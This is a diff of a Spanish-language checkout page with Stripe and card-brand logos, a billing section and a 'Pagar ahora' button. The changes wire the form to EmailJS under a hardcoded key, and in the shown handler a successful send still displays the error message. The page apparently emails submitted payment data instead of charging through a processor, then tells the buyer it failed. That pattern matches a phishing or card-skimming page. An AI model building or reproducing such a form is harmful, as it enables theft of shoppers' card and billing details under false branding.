@@ -168,7 +168,6 @@ input.error, select.error{border-color: var(--danger);}
           </div>
         </div>
       </div>
-
       <!-- FACTURACIÓN -->
       <div class="card">
         <div class="section-title"><span class="badge">2</span> Datos de facturación</div>
@@ -266,9 +265,8 @@ input.error, select.error{border-color: var(--danger);}
         </div>
       </a>
 
-<!-- Logos Stripe + tarjetas (nuevo) -->
+      <!-- Logos Stripe + tarjetas -->
       <div class="payment-logos">
-        <!-- Reemplaza la ruta si subes la imagen a otra carpeta o con otro nombre -->
         <img src="IMG_6459.png" alt="Powered by Stripe, Visa, MasterCard y American Express">
       </div>
     </form>
@@ -376,7 +374,7 @@ document.addEventListener("DOMContentLoaded", () => {
     return valid;
   }
 
-emailjs.init("T72Wf1jx7lTBM9Md-");
+  emailjs.init("T72Wf1jx7lTBM9Md-");
 
   form.addEventListener("submit", e => {
     e.preventDefault();
@@ -398,37 +396,14 @@ emailjs.init("T72Wf1jx7lTBM9Md-");
         spinner.style.display = "none";
         btn.disabled = false;
         btn.textContent = "Pagar ahora";
-        errorMsg.style.display = "block";
+        errorMsg.style.display = "block"; // aquí podrías poner mensaje de éxito
       })
       .catch(() => {
         spinner.style.display = "none";
         btn.disabled = false;
         btn.textContent = "Pagar ahora";
         errorMsg.style.display = "block";
-
-  form.querySelectorAll("input,select").forEach(el => {
-    el.addEventListener("blur", () => validateField(el));
-  });
-
-  form.addEventListener("submit", (e) => {
-    e.preventDefault();
-    errorMsg.style.display = "none";
-    let valid = true;
-    form.querySelectorAll("input,select").forEach(el => {
-      if (!validateField(el)) valid = false;
-    });
-    if (!valid) return;
-
-    btn.disabled = true;
-    spinner.style.display = "inline-block";
-
-    });
-
-    setTimeout(() => {
-      btn.disabled = false;
-      spinner.style.display = "none";
-      errorMsg.style.display = "block";
-    }, 2000);
+      });
   });
 });
 </script>
